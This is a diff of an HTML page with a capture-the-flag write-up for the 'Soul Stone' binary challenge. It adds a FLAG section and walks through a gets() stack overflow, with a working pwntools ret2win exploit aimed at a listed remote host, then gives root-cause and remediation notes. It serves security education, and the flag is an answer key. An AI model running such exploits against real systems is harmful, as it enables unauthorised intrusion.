@@ -68,16 +68,32 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p>Verified live against the remote service on 2026-10-09 (see
-<code>exploit.py REMOTE</code>).</p>
-<h2 id="1-triage"><a class="wu-anchor" href="#1-triage" aria-hidden="true">#</a>1. Triage</h2>
-<figure class="wu-code wu-code-output" data-lines="10">
+<ul>
+<li>Category: Binary Exploitation</li>
+<li>Points: 200 · Difficulty: Easy · Solves: 69</li>
+<li>Author: Suyog Jadhav</li>
+<li>Target: <code>nc 145.239.142.129 1337</code></li>
+<li>Attachment: <code>soul-stone.zip</code> -&gt; <code>soul</code> (ELF 64-bit x86-64, not stripped)</li>
+<li>Flag format: <code>OWASP{...}</code></li>
+</ul>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>FLAG</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
         <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-text">$ file soul
+      <pre id="code-1"><code class="language-text">OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}</code></pre>
+      
+    </figure><p>Verified live against the remote service on 2026-10-09 (see <code>exploit.py REMOTE</code>).</p>
+<h2 id="1-triage"><a class="wu-anchor" href="#1-triage" aria-hidden="true">#</a>1. Triage</h2>
+<figure class="wu-code wu-code-output" data-lines="10">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">$ file soul
 soul: ELF 64-bit LSB executable, x86-64, ... dynamically linked ... not stripped
 
 $ checksec --file=./soul
@@ -88,15 +104,15 @@ $ checksec --file=./soul
     PIE:      No PIE (0x400000)
     SHSTK/IBT Enabled</code></pre>
       
-    </figure><p>Not stripped, No PIE → fixed addresses, and the symbol table hands us the
-goal directly:</p>
+    </figure><p>Not stripped, No PIE -&gt; fixed addresses, and the symbol table hands us the goal
+directly:</p>
 <figure class="wu-code wu-code-output" data-lines="5">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-2"><code class="language-text">$ nm soul
+      <pre id="code-3"><code class="language-text">$ nm soul
 00000000004011b6 T soul_stone     &lt;-- &quot;win&quot;
 00000000004011ee T vault         &lt;-- called by main
 0000000000401297 T main
@@ -110,9 +126,9 @@ goal directly:</p>
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-3"><code class="language-text">main:
+      <pre id="code-4"><code class="language-text">main:
   4012f9: call vault</code></pre>
       
     </figure><p><code>vault</code> prints the vault banner, reads a line with <code>gets</code> into a 0x20-byte
@@ -121,9 +137,9 @@ stack buffer, echoes it back, and returns:</p>
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-4"><code class="language-text">vault:
+      <pre id="code-5"><code class="language-text">vault:
   4011f6: sub  rsp, 0x20          ; 32-byte local buffer
   ...
   401227: lea  rax,[rip+...]      ; &quot;Enter the secret to unlock the Soul Stone: &quot;
@@ -133,22 +149,22 @@ stack buffer, echoes it back, and returns:</p>
   401294: leave
   401295: ret</code></pre>
       
-    </figure><p><code>gets</code> has no length limit, so the 32-byte buffer trivially overruns the
-saved RBP and the saved return address. No canary, so there is nothing to
-leak or preserve.</p>
+    </figure><p><code>gets</code> has no length limit, so the 32-byte buffer trivially overruns the saved
+RBP and the saved return address. No canary, so there is nothing to leak or
+preserve.</p>
 <p><code>soul_stone</code> is the target. It prints the unlock message and the flag:</p>
 <figure class="wu-code wu-code-output" data-lines="2">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-5"><code class="language-text">soul_stone:
+      <pre id="code-6"><code class="language-text">soul_stone:
   4011c8: puts  &quot;Soul Stone unlocked!&quot; / flag</code></pre>
       
     </figure><p>(The flag string is additionally visible with <code>strings soul</code> - the remote
-served the exact same string, confirming the binary and the deployed
-service match.)</p>
+served the exact same string, confirming the binary and the deployed service
+match.)</p>
 <h2 id="3-offset-calculation"><a class="wu-anchor" href="#3-offset-calculation" aria-hidden="true">#</a>3. Offset calculation</h2>
 <p>Standard x86-64 prologue: <code>push rbp; mov rbp,rsp; sub rsp,0x20</code>. The buffer
 starts at <code>rbp-0x20</code>.</p>
@@ -156,27 +172,27 @@ starts at <code>rbp-0x20</code>.</p>
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-6"><code class="language-text">distance to saved RBP = 0x20 (32 bytes)
+      <pre id="code-7"><code class="language-text">distance to saved RBP = 0x20 (32 bytes)
 + 8 bytes for saved RBP itself
 = 40 bytes to reach the saved return address</code></pre>
       
     </figure><p>So: <code>b&#39;A&#39; * 40 + p64(0x4011b6)</code>.</p>
 <p>Alignment note: <code>soul_stone</code> begins with <code>endbr64; push rbp; mov rbp,rsp</code>
 and calls <code>puts</code>, so if the libc <code>puts</code> implementation ever needed 16-byte
-stack alignment at the call site we might need a leading <code>ret</code> gadget. It
-does not matter here - <code>puts</code> was fine and the exploit worked first try
-both local and remote.</p>
+stack alignment at the call site we might need a leading <code>ret</code> gadget. It does
+not matter here - <code>puts</code> was fine and the exploit worked first try both local
+and remote.</p>
 <h2 id="4-exploit"><a class="wu-anchor" href="#4-exploit" aria-hidden="true">#</a>4. Exploit</h2>
 <p><code>exploit.py</code>:</p>
 <figure class="wu-code" data-lines="9">
       <figcaption>
         
         <span class="wu-code-lang">python</span>
-        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-7"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span></span>
+      <pre id="code-8"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span></span>
 <span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span></span></span>
 <span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">HOST, PORT = <span class="hljs-string">&#x27;145.239.142.129&#x27;</span>, <span class="hljs-number">1337</span></span></span>
 <span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">WIN = <span class="hljs-number">0x4011b6</span></span></span>
@@ -186,16 +202,15 @@ both local and remote.</p>
 <span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">io.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * OFF + p64(WIN))</span></span>
 <span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc"><span class="hljs-built_in">print</span>(io.recvall(timeout=<span class="hljs-number">5</span>).decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>))</span></span></code></pre>
       
-    </figure><p>Run: <code>python3 exploit.py REMOTE</code> (or <code>python3 exploit.py</code> for the local
-run).</p>
+    </figure><p>Run: <code>python3 exploit.py REMOTE</code> (or <code>python3 exploit.py</code> for the local run).</p>
 <p>Remote output:</p>
 <figure class="wu-code wu-code-output" data-lines="5">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-8"><code class="language-text">Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;garbage&gt;@!
+      <pre id="code-9"><code class="language-text">Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;garbage&gt;@!
 The Soul Stone remains sealed...
 
 [+] Soul Stone unlocked!
@@ -206,22 +221,22 @@ clobbered the low byte of saved RBP; the <code>ret</code> then jumps straight in
 <code>soul_stone</code> (<code>0x4011b6</code> written <button type="button" class="wu-gloss" data-def="A byte order where the least-significant byte is stored first.">little-endian</button> shows up as the <code>\x11\x40</code> in
 the echoed line).</p>
 <h2 id="5-root-cause"><a class="wu-anchor" href="#5-root-cause" aria-hidden="true">#</a>5. Root cause</h2>
-<p>Return-address overwrite via <code>gets()</code> into a fixed 32-byte stack buffer,
-with no <button type="button" class="wu-gloss" data-def="A random value placed before a return address; if overwritten by a buffer overflow, the program detects it and aborts.">stack canary</button> and no PIE - a textbook ret2win.</p>
+<p>Return-address overwrite via <code>gets()</code> into a fixed 32-byte stack buffer, with
+no <button type="button" class="wu-gloss" data-def="A random value placed before a return address; if overwritten by a buffer overflow, the program detects it and aborts.">stack canary</button> and no PIE - a textbook ret2win.</p>
 <h2 id="6-remediation"><a class="wu-anchor" href="#6-remediation" aria-hidden="true">#</a>6. Remediation</h2>
 <ul>
 <li>Never use <code>gets()</code>; use <code>fgets(buf, sizeof buf, stdin)</code> or <code>getline</code>.</li>
-<li>Compile with <code>-fstack-protector-all</code> (canary) and <code>-fPIE -pie</code> (<button type="button" class="wu-gloss" data-def="Address Space Layout Randomization: randomizes memory addresses each run to make exploits harder to write reliably.">ASLR</button> on
-the code segment) to raise the bar; keep NX/RELRO as-is or go Full RELRO.</li>
-<li>Keep the flag out of the client binary - read it from a server-side
-file/env so a leaked/strings&#39;d binary cannot hand it over.</li>
+<li>Compile with <code>-fstack-protector-all</code> (canary) and <code>-fPIE -pie</code> (<button type="button" class="wu-gloss" data-def="Address Space Layout Randomization: randomizes memory addresses each run to make exploits harder to write reliably.">ASLR</button> on the
+code segment) to raise the bar; keep NX/RELRO as-is or go Full RELRO.</li>
+<li>Keep the flag out of the client binary - read it from a server-side file/env
+so a leaked/strings&#39;d binary cannot hand it over.</li>
 </ul>
 
     </article>
     <nav class="wu-toc" aria-label="On this page">
         <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
         <p class="wu-toc-h">On this page</p>
-        <ol><li><a href="#1-triage">1. Triage</a></li><li><a href="#2-static-analysis">2. Static analysis</a></li><li><a href="#3-offset-calculation">3. Offset calculation</a></li><li><a href="#4-exploit">4. Exploit</a></li><li><a href="#5-root-cause">5. Root cause</a></li><li><a href="#6-remediation">6. Remediation</a></li></ol>
+        <ol><li><a href="#flag">FLAG</a></li><li><a href="#1-triage">1. Triage</a></li><li><a href="#2-static-analysis">2. Static analysis</a></li><li><a href="#3-offset-calculation">3. Offset calculation</a></li><li><a href="#4-exploit">4. Exploit</a></li><li><a href="#5-root-cause">5. Root cause</a></li><li><a href="#6-remediation">6. Remediation</a></li></ol>
       </nav>
   </div>
 
